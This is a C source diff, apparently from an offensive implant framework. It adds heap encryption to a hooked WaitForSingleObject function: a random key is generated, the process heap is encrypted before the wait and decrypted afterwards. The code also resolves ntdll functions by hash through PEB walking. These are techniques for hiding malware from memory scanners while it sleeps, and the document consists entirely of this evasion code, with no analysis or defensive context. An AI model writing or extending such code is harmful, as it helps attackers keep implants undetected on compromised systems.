@@ -42,18 +42,27 @@ D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD
 	API		Api;
 	LARGE_INTEGER	Del;
 
+	BYTE		Key[ 16 ];
+
 	PVOID*		Arg = NULL;
 	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Del, sizeof( Del ) );
+	RtlSecureZeroMemory( &Key, sizeof( Key ) );
+
+	/* Random key generation */
+	RandomString( &Key, sizeof( Key ) );
 
 	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
 	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
 	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
+
+	/* Encrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
 	
 	/* Allocate argument buffer */
 	if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) != NULL ) {
@@ -85,6 +94,9 @@ D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD
 		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
 		Nst = WAIT_FAILED;
 	};
+
+	/* Decrypt the heap */
+	HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
